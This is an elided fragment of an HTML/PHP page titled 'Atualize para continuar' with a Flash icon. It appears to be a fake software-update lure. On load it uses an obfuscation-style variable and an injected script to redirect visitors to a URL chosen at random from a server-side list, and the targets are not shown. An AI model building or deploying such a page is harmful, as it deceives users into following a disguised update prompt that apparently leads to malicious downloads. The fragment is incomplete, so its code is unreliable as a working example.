...
<link rel="icon" 
      ...
      href="flash.png">
<meta charset="utf-8">
<title>Atualize para continuar</title>
<style type="text/css">
#apDiv1 {
	position: absolute;
	left: 0px;
...
var count		= 0;
var canClose	= true;
var _0x1fe0=["<?=$url[rand(0,count($url))];?>"];_0x1fe0[0];
...
<script>
document.write("<script type='text/javascript'>location.href = '<?=$url[rand(0,count($url))];?>';</script>");
</script>
</html>
